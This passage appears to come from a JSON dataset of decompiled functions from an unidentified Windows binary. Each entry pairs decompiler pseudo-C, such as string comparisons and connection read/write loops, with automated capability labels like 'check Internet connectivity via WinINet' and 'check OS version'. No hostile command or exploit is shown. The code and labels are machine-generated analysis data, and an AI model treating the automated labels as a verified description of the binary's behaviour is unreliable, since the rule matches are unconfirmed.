{\n            cVar2 = *var_190h;\n            var_190h = var_190h + 1;\n        } while (cVar2 != '\\0');\n        var_11ch = fcn.00052a50(*var_8h, var_8h[1], &var_88h, var_190h - (&var_88h + 1));\n        if ((var_11ch == 0) && (iVar4 = fcn.0004b510(var_8h, &var_118h, 0x80),  iVar4 != 0)) {\n            var_1a0h = 0xb1be2424;\n            var_1a4h = &var_118h;\n            do {\n                uVar3 = *var_1a4h;\n                bVar9 = uVar3 < *var_1a0h;\n                if (uVar3 != *var_1a0h) {\ncode_r0x0004ab4d:\n                    var_1ach = (1 - bVar9) - (bVar9 != 0);\n                    goto code_r0x0004ab58;\n                }\n                if (uVar3 == 0) break;\n                uVar3 = *(var_1a4h + 1);\n                bVar9 = uVar3 < var_1a0h[1];\n                if (uVar3 != var_1a0h[1]) goto code_r0x0004ab4d;\n                var_1a4h = var_1a4h + 2;\n                var_1a0h = var_1a0h + 2;\n            } while (uVar3 != 0);\n            var_1ach = 0;\ncode_r0x0004ab58:\n            if (var_1ach == 0) {\n                puVar7 = 0xb1be242c;\n                puVar8 = &var_88h;\n                for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = *puVar7;\n                    puVar7 = puVar7 + 1;\n                    puVar8 = puVar8 + 1;\n                }\n                *puVar8 = *puVar7;\n                var_1b4h = &var_88h;\n                do {\n                    cVar2 = *var_1b4h;\n                    var_1b4h = var_1b4h + 1;\n                } while (cVar2 != '\\0');\n                var_11ch = fcn.00052a50(*var_8h, var_8h[1], &var_88h, var_1b4h - (&var_88h + 1));\n                if (var_11ch == 0) {\n                    var_124h = 0;\n                    *var_8ch = '\\0';\n                    while (iVar4 = fcn.0004b510(var_8h, &var_118h, 0x80),  iVar4 != 0) {\n                        var_1c4h = 0xb1be2450;\n                        var_1c8h = &var_118h;\n                        do {\n                            uVar3 = *var_1c8h;\n                            bVar9 = uVar3 < *var_1c4h;\n                            if (uVar3 != *var_1c4h) {\ncode_r0x0004aca9:\n                                var_1d0h = (1 - bVar9) - (bVar9 != 0);\n                                goto code_r0x0004acb4;\n                            }\n                            if (uVar3 == 0) break;\n                            uVar3 = *(var_1c8h + 1);\n                            bVar9 = uVar3 < var_1c4h[1];\n                            if (uVar3 != var_1c4h[1]) goto code_r0x0004aca9;\n                            var_1c8h = var_1c8h + 2;\n                            var_1c4h = var_1c4h + 2;\n                        } while (uVar3 != 0);\n                        var_1d0h = 0;\ncode_r0x0004acb4:\n                        if (var_1d0h == 0) goto code_r0x0004b1e4;\n                        if (var_124h == 0) {\n                            var_1d8h = 0xb1be2454;\n                            var_1dch = &var_118h;\n                            do {\n                                uVar3 = *var_1dch;\n                                bVar9 = uVar3 < *var_1d8h;\n                                if (uVar3 != *var_1d8h) {\ncode_r0x0004ad4f:\n                                    var_1e4h = (1 - bVar9) - (bVar9 != 0);\n                                    goto code_r0x0004ad5a;\n                                }\n                                if (uVar3 == 0) break;\n                                uVar3 = *(var_1dch + 1);\n                                bVar9 = uVar3 < var_1d8h[1];\n                                if (uVar3 != var_1d8h[1]) goto code_r0x0004ad4f;\n                                var_1dch = var_1dch + 2;\n                                var_1d8h = var_1d8h + 2;\n                            } while (uVar3 != 0);\n                            var_1e4h = 0;\ncode_r0x0004ad5a:\n                            if (var_1e4h == 0) {\n                                var_124h = 1;\n                            }\n                            else {\n                                var_1ech = var_8ch;\n                                do {\n                                    cVar2 = *var_1ech;\n                                    var_1ech = var_1ech + 1;\n                                } while (cVar2 != '\\0');\n                                var_1fch = &var_118h;\n                                do {\n                                    cVar2 = *var_1fch;\n                                    var_1fch = var_1fch + 1;\n                                } while (cVar2 != '\\0');\n                                if (var_1ech + var_1fch + (-(&var_118h + 1) - (var_8ch + 1)) < 0x2000) {\n                                    var_20ch = &var_118h;\n                                    do {\n                                        cVar2 = *var_20ch;\n                                        var_20ch = var_20ch + 1;\n                                    } while (cVar2 != '\\0');\n                                    uVar6 = var_20ch - &var_118h;\n                                    var_220h = var_8ch + -1;\n                                    do {\n                                        pcVar1 = var_220h + 1;\n                                        var_220h = var_220h + 1;\n                                    } while (*pcVar1 != '\\0');\n                                    puVar7 = &var_118h;\n                                    for (uVar5 = uVar6 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n                                        *var_220h = *puVar7;\n                                        puVar7 = puVar7 + 1;\n                                        var_220h = var_220h + 1;\n                                    }\n                                    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                                        *var_220h = *puVar7;\n                                        puVar7 = puVar7 + 1;\n                                        var_220h = var_220h + 1;\n                                    }\n                                }\n                                else {\n                                    var_124h = 1;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            else {\n                var_228h = &var_118h;\n                do {\n                    cVar2 = *var_228h;\n                    var_228h = var_228h + 1;\n                } while (cVar2 != '\\0');\n                if ((var_228h - (&var_118h + 1) < 6) || (iVar4 = fcn.00078706(&var_118h, 0xb1be2458, 5),  iVar4 != 0)) {\n                    puVar7 = 0xb1be2498;\n                    puVar8 = &var_88h;\n                    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar8 = *puVar7;\n                        puVar7 = puVar7 + 1;\n                        puVar8 = puVar8 + 1;\n                    }\n                    *puVar8 = *puVar7;\n                    var_260h = &var_88h;\n                    do {\n                        cVar2 = *var_260h;\n                        var_260h = var_260h + 1;\n                    } while (cVar2 != '\\0');\n                    fcn.00052a50(*var_8h, var_8h[1], &var_88h, var_260h - (&var_88h + 1));\n                }\n                else {\n                    var_98h = fcn.00035eb0(&var_113h, &var_4h, 10);\n                    var_238h = 0xb1be2460;\n                    var_23ch = var_4h;\n                    do {\n                        uVar3 = *var_23ch;\n                        bVar9 = uVar3 < *var_238h;\n                        if (uVar3 != *var_238h) {\ncode_r0x0004afe6:\n                            var_244h = (1 - bVar9) - (bVar9 != 0);\n                            goto code_r0x0004aff1;\n                        }\n                        if (uVar3 == 0) break;\n                        uVar3 = var_23ch[1];\n                        bVar9 = uVar3 < var_238h[1];\n                        if (uVar3 != var_238h[1]) goto code_r0x0004afe6;\n                        var_23ch = var_23ch + 2;\n                        var_238h = var_238h + 2;\n                    } while (uVar3 != 0);\n                    var_244h = 0;\ncode_r0x0004aff1:\n                    if (var_244h == 0) {\n                        var_90h = 0;\n                        do {\n                            if (var_90h < 0x1fff) {\n                                if (var_98h - var_90h < 0x1fff) {\n                                    var_25ch = var_98h - var_90h;\n                                }\n                                else {\n                                    var_25ch = 0x1fff;\n                                }\n                                iVar4 = fcn.00048650(var_8h, var_8ch, var_25ch, &var_94h, 0);\n                            }\n                            else {\n                                iVar4 = fcn.00048650(var_8h, &var_118h, 0x80, &var_94h, 0);\n                            }\n                            if (iVar4 == 0) goto code_r0x0004b4c1;\n                            var_90h = var_90h + var_94h;\n                        } while (var_90h < var_98h);\n                        var_8ch[var_90h] = '\\0';\ncode_r0x0004b1e4:\n                        var_270h = var_8ch;\n                        do {\n                            cVar2 = *var_270h;\n                            var_270h = var_270h + 1;\n                        } while (cVar2 != '\\0');\n                        iVar4 = fcn.00048b50(var_8ch, var_270h + (1 - (var_8ch + 1)), &var_13ch, 0, 0);\n                        if (iVar4 == 0) {\n                            fcn.00052a50(*var_8h, var_8h[1], 0xb1bdeaa4, 0x33);\n                        }\n                        else {\n                            puVar7 = 0xb1be24b8;\n                            puVar8 = &var_88h;\n                            for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *puVar8 = *puVar7;\n                                puVar7 = puVar7 + 1;\n                                puVar8 = puVar8 + 1;\n                            }\n                            *puVar8 = *puVar7;\n                            *(puVar8 + 2) = *(puVar7 + 2);\n                            var_280h = &var_88h;\n                            do {\n                                cVar2 = *var_280h;\n                                var_280h = var_280h + 1;\n                            } while (cVar2 != '\\0');\n                            var_11ch = fcn.00052a50(*var_8h, var_8h[1], &var_88h, var_280h - (&var_88h + 1));\n                            if ((var_11ch == 0) && (iVar4 = fcn.0004b510(var_8h, &var_118h, 0x80),  iVar4 != 0)) {\n                                var_290h = 0xb1be24d8;\n                                var_294h = &var_118h;\n                                do {\n                                    uVar3 = *var_294h;\n                                    bVar9 = uVar3 < *var_290h;\n                                    if (uVar3 != *var_290h) {\ncode_r0x0004b398:\n                                        var_29ch = (1 - bVar9) - (bVar9 != 0);\n                                        goto code_r0x0004b3a3;\n                                    }\n                                    if (uVar3 == 0) break;\n                                    uVar3 = *(var_294h + 1);\n                                    bVar9 = uVar3 < var_290h[1];\n                                    if (uVar3 != var_290h[1]) goto code_r0x0004b398;\n                                    var_294h = var_294h + 2;\n                                    var_290h = var_290h + 2;\n                                } while (uVar3 != 0);\n                                var_29ch = 0;\ncode_r0x0004b3a3:\n                                if (var_29ch == 0) {\n                                    puVar7 = 0xb1be24e0;\n                                    puVar8 = &var_88h;\n                                    for (iVar4 = 10; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                        *puVar8 = *puVar7;\n                                        puVar7 = puVar7 + 1;\n                                        puVar8 = puVar8 + 1;\n                                    }\n                                    *puVar8 = *puVar7;\n                                    *(puVar8 + 2) = *(puVar7 + 2);\n                                    var_2b4h = &var_88h;\n                                    do {\n                                        cVar2 = *var_2b4h;\n                                        var_2b4h = var_2b4h + 1;\n                                    } while (cVar2 != '\\0');\n                                    fcn.00052a50(*var_8h, var_8h[1], &var_88h, var_2b4h - (&var_88h + 1));\n                                }\n                                else {\n                                    puVar7 = 0xb1be23f8;\n                                    puVar8 = &var_88h;\n                                    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                        *puVar8 = *puVar7;\n                                        puVar7 = puVar7 + 1;\n                                        puVar8 = puVar8 + 1;\n                                    }\n                                    *puVar8 = *puVar7;\n                                    *(puVar8 + 2) = *(puVar7 + 2);\n                                    var_2a4h = &var_88h;\n                                    do {\n                                        cVar2 = *var_2a4h;\n                                        var_2a4h = var_2a4h + 1;\n                                    } while (cVar2 != '\\0');\n                                    fcn.00052a50(*var_8h, var_8h[1], &var_88h, var_2a4h - (&var_88h + 1));\n                                }\n                            }\n                        }\n                    }\n                    else {\n                        puVar7 = 0xb1be2468;\n                        puVar8 = &var_88h;\n                        for (iVar4 = 0xb; iVar4 != 0; iVar4 = iVar4 + -1) {\n                            *puVar8 = *puVar7;\n                            puVar7 = puVar7 + 1;\n                            puVar8 = puVar8 + 1;\n                        }\n                        *puVar8 = *puVar7;\n                        var_24ch = &var_88h;\n                        do {\n                            cVar2 = *var_24ch;\n                            var_24ch = var_24ch + 1;\n                        } while (cVar2 != '\\0');\n                        fcn.00052a50(*var_8h, var_8h[1], &var_88h, var_24ch - (&var_88h + 1));\n                    }\n                }\n            }\n        }\n    }\n    else {\n        puVar7 = 0xb1be23f8;\n        puVar8 = &var_88h;\n        for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar8 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar8 = puVar8 + 1;\n        }\n        *puVar8 = *puVar7;\n        *(puVar8 + 2) = *(puVar7 + 2);\n        var_180h = &var_88h;\n        do {\n            cVar2 = *var_180h;\n            var_180h = var_180h + 1;\n        } while (cVar2 != '\\0');\n        fcn.00052a50(*var_8h, var_8h[1], &var_88h, var_180h - (&var_88h + 1));\n    }\ncode_r0x0004b4c1:\n    fcn.00035330(var_8h);\n    fcn.00035330(var_8ch);\n    fcn.000529b0(*(var_120h + 0x10), *(var_120h + 0x14));\n    fcn.00052b30(var_120h);\n    return 0;\n}\n",
        "token_count": 6506
    },
    "0004b510": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint __cdecl fcn.0004b510(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    while( true ) {\n        iVar1 = fcn.00048650(arg_8h, arg_ch, arg_10h + -1, &var_8h, 1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        var_4h = fcn.000786fa(arg_ch, 10, arg_10h);\n        if ((var_4h != 0) || (var_8h == arg_10h + -1)) break;\n        var_8h = arg_8h;\n        iVar1 = fcn.00048870(arg_8h);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    if (var_4h != 0) {\n        var_8h = (var_4h + 1) - arg_ch;\n    }\n    iVar1 = fcn.00048650(arg_8h, arg_ch, var_8h, &var_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(arg_ch + var_8h) = 0;\n    return 1;\n}\n",
        "token_count": 332
    },
    "0004b5c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0004b5c0(void)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if (*0xb1c5b6f8 == 0) {\n        fcn.00032220(0xb1c683a0);\n        fcn.00032220(0xb1c5a714);\n        fcn.00033ff0(0xb1c67794);\n        *0xb1c67798 = 0;\n        fcn.0001a8e0(0xb1c5b6f8, 0xb1c19c60, 0);\n        *0xb1c5a6dc = 0x24;\n        *0xb1c5a6e0 = 0xb1be250c;\n        *0xb1c5a6e4 = &var_4h;\n        iVar1 = fcn.00078670(1, 0xb1be252c, 0xb1c5a6d8, 0, 0);\n        if (iVar1 == 0) {\n            *0xb1c683a4 = var_4h != 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 278
    },
    "0004b660": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.0004b660(void)\n\n{\n    uint var_1h;\n    \n    *0xb1c67798 = 1;\n    fcn.000340b0(0xb1c67794);\n    fcn.00037270(0xb1c5b6f8, 0);\n    fcn.00037220(0xb1c5b6f8);\n    fcn.00034080(0xb1c67794);\n    (**0xb1bde00c)();\n    if (*0xb1c5a710 != 0) {\n        fcn.0004e450(*0xb1c5a710);\n        *0xb1c5a710 = 0;\n    }\n    (**0xb1bde010)();\n    return;\n}\n",
        "token_count": 188
    },
    "0004b6e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0004b6e0(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t var_5dh;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_34h;\n    uint var_30h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uchar var_eh;\n    uchar var_dh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_14h = 3;\n    iVar2 = fcn.00020650(arg_10h, 0x1a, 2, &var_4ch, 4);\n    if (iVar2 == 0) {\n        uVar3 = 0x21590065;\n    }\n    else {\n        iVar2 = fcn.0003da90(var_4ch, 0);\n        if (iVar2 == 0) {\n            uVar3 = 0x21590065;\n        }\n        else {\n            iVar2 = fcn.000205e0(arg_10h, 0x2c, 4, &var_1ch, 0);\n            if ((iVar2 == 0) || (cVar1 = fcn.0004db20(var_1ch, &var_68h),  cVar1 == '\\0')) {\n                uVar3 = 0x21590066;\n            }\n            else {\n                iVar2 = fcn.000205e0(arg_10h, 0x2d, 4, &var_48h, 0);\n                if ((iVar2 == 0) || (cVar1 = fcn.0004db20(var_48h, &var_ch),  cVar1 == '\\0')) {\n                    uVar3 = 0x21590067;\n                }\n                else {\n                    var_5dh._0_1_ = 1;\n                    fcn.00020650(arg_10h, 0x30, 1, &var_5dh, 1);\n                    var_eh = 1;\n                    fcn.00020650(arg_10h, 0x31, 1, &var_eh, 1);\n                    iVar2 = fcn.000205e0(arg_10h, 0x2e, 4, &var_18h, 0);\n                    if (iVar2 == 0) {\n                        cVar1 = fcn.0004e490(var_4ch, var_68h, &var_44h);\n                        if (cVar1 == '\\0') {\n                            return 0x2159006a;\n                        }\n                        var_8h = var_34h;\n                        var_4h._0_2_ = var_30h;\n                    }\n                    else {\n                        cVar1 = fcn.0004dc20(var_18h, &var_8h);\n                        if (cVar1 == '\\0') {\n                            return 0x2159006a;\n                        }\n                    }\n                    iVar2 = fcn.000205e0(arg_10h, 0x2f, 4, &var_58h, 0);\n                    if (iVar2 == 0) {\n                        cVar1 = fcn.0004e490(var_4ch, var_ch, &var_44h);\n                        if (cVar1 == '\\0') {\n                            return 0x2159006b;\n                        }\n                        var_54h = var_34h;\n                        var_50h._0_2_ = var_30h;\n                    }\n                    else {\n                        cVar1 = fcn.0004dc20(var_58h, &var_54h);\n                        if (cVar1 == '\\0') {\n                            return 0x2159006b;\n                        }\n                    }\n                    var_dh = (**0xb1bde00c)();\n                    var_64h = -1;\n                    stack0xffffffa0 = 0x21590004;\n                    for (var_14h = 0; var_14h < 0x40; var_14h = var_14h + 1) {\n                        if (*(var_14h * 0x30 + -0x4e398848) == 0) {\n                            if (var_64h == -1) {\n                                var_64h = var_14h;\n                            }\n                        }\n                        else if (((*(var_14h * 0x30 + -0x4e398848) == var_4ch) &&\n                                 (*(var_14h * 0x30 + -0x4e398860) == var_68h)) &&\n                                (*(var_14h * 0x30 + -0x4e398854) == var_ch)) {\n                            *(var_14h * 0x30 + -0x4e39885c) = var_8h;\n                            *(var_14h * 0x30 + -0x4e398858) = var_4h;\n                            *(var_14h * 0x30 + -0x4e398850) = var_54h;\n                            *(var_14h * 0x30 + -0x4e39884c) = var_50h;\n                            *(var_14h * 0x30 + -0x4e398843) = var_5dh;\n                            *(var_14h * 0x30 + -0x4e398844) = var_eh;\n                            *(var_14h * 0x30 + -0x4e398840) = 0;\n                            *(var_14h * 0x30 + -0x4e39883c) = 0;\n                            stack0xffffffa0 = 0;\n                            break;\n                        }\n                    }\n                    if ((0x3f < var_14h) && (var_64h != -1)) {\n                        fcn.00078790(var_64h * 0x30 + -0x4e398860, 0, 0x30);\n                        *(var_64h * 0x30 + -0x4e398848) = var_4ch;\n                        *(var_64h * 0x30 + -0x4e398860) = var_68h;\n                        *(var_64h * 0x30 + -0x4e398854) = var_ch;\n                        *(var_64h * 0x30 + -0x4e39885c) = var_8h;\n                        *(var_64h * 0x30 + -0x4e398858) = var_4h;\n                        *(var_64h * 0x30 + -0x4e398850) = var_54h;\n                        *(var_64h * 0x30 + -0x4e39884c) = var_50h;\n                        *(var_64h * 0x30 + -0x4e398843) = var_5dh;\n                        *(var_64h * 0x30 + -0x4e398844) = var_eh;\n                        stack0xffffffa0 = 0;\n                    }\n                    (**0xb1bde010)();\n                    if (stack0xffffffa0 == 0) {\n                        fcn.000340b0(0xb1c67794);\n                    }\n                    uVar3 = fcn.0004ba90(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n                }\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 1780
    },
    "0004ba90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_f0h\n\nuint __cdecl fcn.0004ba90(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint var_f0h;\n    uint var_e8h;\n    int16_t *var_e4h;\n    uint var_e0h;\n    uint var_d8h;\n    int16_t *var_d4h;\n    uint var_d0h;\n    uint var_c8h;\n    int16_t *var_c4h;\n    uint var_c0h;\n    uint var_b8h;\n    int16_t *var_b4h;\n    uint var_b0h;\n    uint var_a8h;\n    int16_t *var_a4h;\n    uint var_a0h;\n    uint var_98h;\n    int16_t *var_94h;\n    uint var_90h;\n    uint var_88h;\n    int16_t *var_84h;\n    uint var_80h;\n    uint var_78h;\n    int16_t *var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uchar var_15h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_6ch = 0;\n    *arg_14h = 3;\n    var_ch = 0;\n    var_8h = 0;\n    var_14h = 9;\n    var_10h = &var_68h;\n    fcn.00078790(&var_68h, 0, 0x48);\n    *var_10h = 0x27;\n    var_10h[1] = 2;\n    var_10h[2] = 0x3b;\n    var_10h[3] = 4;\n    var_10h[4] = 0x3d;\n    var_10h[5] = 4;\n    var_10h[6] = 0x3c;\n    var_10h[7] = 4;\n    var_10h[8] = 0x3e;\n    var_10h[9] = 4;\n    var_10h[10] = 0x3f;\n    var_10h[0xb] = 1;\n    var_10h[0xc] = 0x40;\n    var_10h[0xd] = 1;\n    var_10h[0xe] = 0x41;\n    var_10h[0xf] = 2;\n    var_10h[0x10] = 0x42;\n    var_10h[0x11] = 2;\n    var_15h = (**0xb1bde00c)();\n    var_1ch = 0;\n    for (var_20h = 0; var_20h < 0x40; var_20h = var_20h + 1) {\n        if (*(var_20h * 0x30 + -0x4e398848) != 0) {\n            var_1ch = var_1ch + 1;\n        }\n    }\n    if (var_1ch == 0) {\n        var_70h = 0;\n        (**0xb1bde010)();\n    }\n    else {\n        var_6ch = fcn.00035230(var_1ch * 0x30);\n        if (var_6ch == 0) {\n            var_70h = 0x21590004;\n            (**0xb1bde010)();\n        }\n        else {\n            var_1ch = 0;\n            for (var_20h = 0; var_20h < 0x40; var_20h = var_20h + 1) {\n                if (*(var_20h * 0x30 + -0x4e398848) != 0) {\n                    puVar4 = var_20h * 0x30 + -0x4e398860;\n                    puVar5 = var_1ch * 0x30 + var_6ch;\n                    for (iVar3 = 0xc; iVar3 != 0; iVar3 = iVar3 + -1) {\n                        *puVar5 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar5 = puVar5 + 1;\n                    }\n                    var_1ch = var_1ch + 1;\n                }\n            }\n            (**0xb1bde010)();\n            var_ch = var_1ch;\n            var_8h = fcn.000352f0(var_1ch, 4);\n            if (var_8h == 0) {\n                var_70h = 0x21590004;\n            }\n            else {\n                for (var_20h = 0; var_20h < var_1ch; var_20h = var_20h + 1) {\n                    uVar2 = fcn.00035200(var_14h * 0x10 + 0x88);\n                    *(var_8h + var_20h * 4) = uVar2;\n                    if (*(var_8h + var_20h * 4) == 0) {\n                        var_70h = 0x21590004;\n                        goto code_r0x0004c347;\n                    }\n                    fcn.00078790(*(var_8h + var_20h * 4), 0, var_14h << 4);\n                    var_4h = var_14h * 0x10 + *(var_8h + var_20h * 4);\n                    *(*(var_8h + var_20h * 4) + 4) = *(var_8h + var_20h * 4) + 8;\n                    **(var_8h + var_20h * 4) = 4;\n                    **(*(var_8h + var_20h * 4) + 4) = *(var_6ch + 0x18 + var_20h * 0x30);\n                    fcn.000785aa(var_4h, 0xb1be2550, *(var_6ch + var_20h * 0x30), *(var_6ch + 1 + var_20h * 0x30), \n                                 *(var_6ch + 2 + var_20h * 0x30), *(var_6ch + 3 + var_20h * 0x30));\n                    *(*(var_8h + var_20h * 4) + 0x14) = var_4h;\n                    var_74h = var_4h;\n                    do {\n                        iVar1 = *var_74h;\n                        var_74h = var_74h + 1;\n                    } while (iVar1 != 0);\n                    *(*(var_8h + var_20h * 4) + 0x10) = (var_74h - (var_4h + 1) >> 1) * 2 + 2;\n                    var_84h = var_4h;\n                    do {\n                        iVar1 = *var_84h;\n                        var_84h = var_84h + 1;\n                    } while (iVar1 != 0);\n                    var_4h = var_4h + (var_84h - (var_4h + 1) >> 1) + 1;\n                    fcn.000785aa(var_4h, 0xb1be1f44, *(var_6ch + 4 + var_20h * 0x30), *(var_6ch + 5 + var_20h * 0x30), \n                                 *(var_6ch + 6 + var_20h * 0x30), *(var_6ch + 7 + var_20h * 0x30), \n                                 *(var_6ch + 8 + var_20h * 0x30), *(var_6ch + 9 + var_20h * 0x30));\n                    *(*(var_8h + var_20h * 4) + 0x24) = var_4h;\n                    var_94h = var_4h;\n                    do {\n                        iVar1 = *var_94h;\n                        var_94h = var_94h + 1;\n                    } while (iVar1 != 0);\n                    *(*(var_8h + var_20h * 4) + 0x20) = (var_94h - (var_4h + 1) >> 1) * 2 + 2;\n                    var_a4h = var_4h;\n                    do {\n                        iVar1 = *var_a4h;\n                        var_a4h = var_a4h + 1;\n                    } while (iVar1 != 0);\n                    var_4h = var_4h + (var_a4h - (var_4h + 1) >> 1) + 1;\n                    fcn.000785aa(var_4h, 0xb1be2550, *(var_6ch + 0xc + var_20h * 0x30), \n                                 *(var_6ch + 0xd + var_20h * 0x30), *(var_6ch + 0xe + var_20h * 0x30), \n                                 *(var_6ch + 0xf + var_20h * 0x30));\n                    *(*(var_8h + var_20h * 4) + 0x34) = var_4h;\n                    var_b4h = var_4h;\n                    do {\n                        iVar1 = *var_b4h;\n                        var_b4h = var_b4h + 1;\n                    } while (iVar1 != 0);\n                    *(*(var_8h + var_20h * 4) + 0x30) = (var_b4h - (var_4h + 1) >> 1) * 2 + 2;\n                    var_c4h = var_4h;\n                    do {\n                        iVar1 = *var_c4h;\n                        var_c4h = var_c4h + 1;\n                    } while (iVar1 != 0);\n                    var_4h = var_4h + (var_c4h - (var_4h + 1) >> 1) + 1;\n                    fcn.000785aa(var_4h, 0xb1be1f44, *(var_6ch + 0x10 + var_20h * 0x30), \n                                 *(var_6ch + 0x11 + var_20h * 0x30), *(var_6ch + 0x12 + var_20h * 0x30), \n                                 *(var_6ch + 0x13 + var_20h * 0x30), *(var_6ch + 0x14 + var_20h * 0x30), \n                                 *(var_6ch + 0x15 + var_20h * 0x30));\n                    *(*(var_8h + var_20h * 4) + 0x44) = var_4h;\n                    var_d4h = var_4h;\n                    do {\n                        iVar1 = *var_d4h;\n                        var_d4h = var_d4h + 1;\n                    } while (iVar1 != 0);\n                    *(*(var_8h + var_20h * 4) + 0x40) = (var_d4h - (var_4h + 1) >> 1) * 2 + 2;\n                    var_e4h = var_4h;\n                    do {\n                        iVar1 = *var_e4h;\n                        var_e4h = var_e4h + 1;\n                    } while (iVar1 != 0);\n                    var_4h = var_4h + (var_e4h - (var_4h + 1) >> 1) + 1;\n                    *(*(var_8h + var_20h * 4) + 0x54) = *(var_8h + var_20h * 4) + 0x58;\n                    *(*(var_8h + var_20h * 4) + 0x50) = 1;\n                    **(*(var_8h + var_20h * 4) + 0x54) = *(var_6ch + 0x1d + var_20h * 0x30) != '\\0';\n                    *(*(var_8h + var_20h * 4) + 100) = *(var_8h + var_20h * 4) + 0x68;\n                    *(*(var_8h + var_20h * 4) + 0x60) = 1;\n                    **(*(var_8h + var_20h * 4) + 100) = *(var_6ch + 0x1c + var_20h * 0x30) != '\\0';\n                    *(*(var_8h + var_20h * 4) + 0x74) = *(var_8h + var_20h * 4) + 0x78;\n                    *(*(var_8h + var_20h * 4) + 0x70) = 4;\n                    **(*(var_8h + var_20h * 4) + 0x74) = *(var_6ch + 0x28 + var_20h * 0x30);\n                    *(*(var_8h + var_20h * 4) + 0x84) = *(var_8h + var_20h * 4) + 0x88;\n                    *(*(var_8h + var_20h * 4) + 0x80) = 4;\n                    **(*(var_8h + var_20h * 4) + 0x84) = *(var_6ch + 0x2c + var_20h * 0x30);\n                }\n                var_70h = fcn.0002ee00(&var_14h, arg_18h, arg_1ch);\n            }\n        }\n    }\ncode_r0x0004c347:\n    if (var_8h != 0) {\n        for (var_20h = 0; var_20h < var_ch; var_20h = var_20h + 1) {\n            fcn.00035330(*(var_8h + var_20h * 4));\n        }\n    }\n    fcn.00035330(var_8h);\n    if (var_6ch != 0) {\n        fcn.00035330(var_6ch);\n    }\n    return var_70h;\n}\n",
        "token_count": 3399
    },
    "0004c3b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
